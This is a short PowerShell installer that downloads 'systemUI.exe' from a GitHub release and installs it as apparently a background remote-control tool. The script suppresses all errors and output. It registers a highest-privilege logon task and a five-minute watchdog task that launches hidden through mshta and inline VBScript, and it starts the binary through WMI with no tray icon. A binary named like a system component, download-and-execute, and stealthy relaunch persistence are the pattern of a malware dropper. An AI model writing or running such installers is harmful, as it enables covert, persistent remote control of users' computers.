param([switch]$notray)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

$Dir = "C:\daljinac"
$Exe = "$Dir\systemUI.exe"
$URL = "https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe"
$ExtraArgs = "-notray"

Write-Host "[1/3] Downloading..."
mkdir $Dir -Force | Out-Null
Invoke-WebRequest $URL -OutFile "$Exe.new" -UseBasicParsing
Write-Host "       $((Get-Item "$Exe.new").Length) bytes"

Write-Host "[1b/3] Replacing old binary..."
Get-Process systemUI -ErrorAction SilentlyContinue | Stop-Process -Force
Get-Process daljinac -ErrorAction SilentlyContinue | Stop-Process -Force
Move-Item -Force "$Exe.new" $Exe

Write-Host "[2/3] Installing scheduled task..."
schtasks /delete /tn Daljinac /f 2>$null

$action  = New-ScheduledTaskAction -Execute $Exe -Argument $ExtraArgs
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet
$principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName Daljinac -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
schtasks /create /tn DaljinacWatch /tr "mshta.exe vbscript:CreateObject(""WScript.Shell"").Run(""schtasks /run /tn Daljinac"",0,False)(window.close)" /sc MINUTE /mo 5 /f 2>$null

Write-Host "[3/3] Starting..."
([wmiclass]'Win32_Process').Create("$Exe $ExtraArgs") | Out-Null

Write-Host ""
Write-Host "DONE." -ForegroundColor Green
Write-Host "  Mode: no-tray (background)"
